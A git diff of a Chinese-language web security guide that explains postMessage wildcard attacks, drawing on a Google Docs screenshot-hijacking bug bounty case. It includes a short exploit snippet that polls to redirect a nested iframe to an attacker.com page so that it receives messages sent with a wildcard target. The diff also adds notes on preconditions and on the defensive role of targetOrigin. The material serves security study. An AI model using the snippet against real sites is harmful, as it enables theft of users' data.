@@ -315,6 +315,8 @@ document.body.appendChild(probe);
 
 ### 3.4.1 修改子 iframe location 窃取消息
 
+> 实战案例详解：[Google VRP — Hijacking Google Docs Screenshots](Google%20VRP%20Case%20Study%20-%20Hijacking%20Google%20Docs%20Screenshots.md)
+
 **前提**：父页面可被 iframe（无 X-Frame-Options），父页面含子 iframe，父用 wildcard 向子 iframe 发送敏感消息。
 
 ```html
@@ -324,6 +326,7 @@ document.body.appendChild(probe);
     setTimeout(exp, 6000);
     function exp(){
       // 每 100ms 尝试修改子 iframe 的 location
+      // 需要持续轮询是因为目标 iframe 可能在页面加载时不存在（动态创建）
       setInterval(function(){
         window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
       }, 100);
@@ -334,10 +337,40 @@ document.body.appendChild(probe);
 
 攻击流：`window.frames[0]`（主 iframe）→ `frame[0][2]`（孙子 iframe）→ 将 location 改为攻击者控制页面 → 攻击者页面的 `onmessage` 接收 wildcard 发出的敏感消息。
 
-### 3.4.2 注意事项
+**必须持续轮询的原因**：目标 iframe 往往不是页面加载时就存在的——例如 Google Docs 的反馈 iframe 只在用户点击 "Send Feedback" 后才被动态创建。因此需要 `setInterval(100ms)` 不断尝试修改一个**可能尚不存在**的 iframe，一旦创建即在下一个轮询周期被捕获。
+
+### 3.4.2 wildcard vs specific targetOrigin：同一功能中的不对等防护
+
+Google Docs 案例揭示了一个关键模式：**同一个应用中，不同通信路径使用了不同等级的 targetOrigin 保护**。
+
+```
+[docs.google.com]
+  │ postMessage(像素RGB值)
+  ↓
+[www.google.com] ← iframe 1
+  │ postMessage(RGB值, "https://feedback.googleusercontent.com")  ← 精确 targetOrigin ✅
+  ↓
+[feedback.googleusercontent.com] ← iframe 2 (渲染层)
+  │ postMessage(base64, "https://www.google.com")                 ← 精确 targetOrigin ✅
+  ↓
+[www.google.com]
+  │ postMessage(截图+描述, "*")                                    ← WILDCARD ❌
+  ↓
+提交窗口
+```
+
+当攻击者尝试替换 iframe 2（渲染层）时——**失败**，因为 `www.google.com` 向渲染层发消息时 targetOrigin 精确匹配 `feedback.googleusercontent.com`，浏览器在发送前校验 origin 不匹配，拒绝发送。
+
+当攻击者改为替换提交窗口时——**成功**，因为最终提交用了 `"*"` wildcard，浏览器不校验目标 origin。
+
+**核心教训**：`targetOrigin` 是**发送方的防线**，与接收方的 `event.origin` 检查是独立的。两者互补且同等重要。攻击者只需要找到一条使用了 wildcard 的通信路径。
+
+### 3.4.3 注意事项
 
 - 通配符 `*` 是攻击前提 — 如果 targetOrigin 指定了具体 URL 则此攻击无效
 - 需要目标页面可被 iframe（无 `X-Frame-Options: DENY` 或 `frame-ancestors` CSP）
+- 即使外层有 X-Frame-Options，popup 变体（`window.open()`）仍可使用
+- 需要通过 DevTools frame tree 或枚举确定正确的嵌套索引路径（如 `frames[0].frame[0][2]`）
 
 ---
 
@@ -730,7 +763,7 @@ postMessage(PP payload, '*') → iframe 内 JS 合并对象 → Object.prototype
 
 | 案例 | 类型 | 影响 |
 |------|------|------|
-| [Google VRP — Screenshot Hijacking](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) | Wildcard + iframe location 劫持 | 窃取 Google Docs 截图 |
+| [Google VRP — Screenshot Hijacking](https://blog.geekycat.in/posts/hijacking-google-docs-screenshots/) | Wildcard + iframe location 劫持 | 窃取 Google Docs 截图 |
 | [CAPIG XSS — Facebook Conversions API](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html) | Origin 衍生脚本加载 + Stored XSS | www.meta.com 代码执行 |
 | [Leaking fbevents — Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html) | Origin-only trust + relay 滥用 | OAuth code 窃取 → 账户接管 |
 | [Facebook Payments Self-XSS](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html) | Math.random token 预测 | 支付页面 DOM XSS |
